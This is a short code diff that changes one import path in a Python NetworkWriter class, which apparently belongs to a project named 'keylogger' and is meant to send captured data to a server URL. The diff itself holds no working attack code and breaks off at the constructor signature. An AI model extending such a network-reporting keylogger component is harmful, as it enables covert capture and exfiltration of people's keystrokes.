@@ -1,6 +1,6 @@
 import socket
 import requests
-from iwriter import IWriter
+from keylogger.writer.iwriter import IWriter
 
 class NetworkWriter(IWriter):
     def __init__(self, server_url: str):
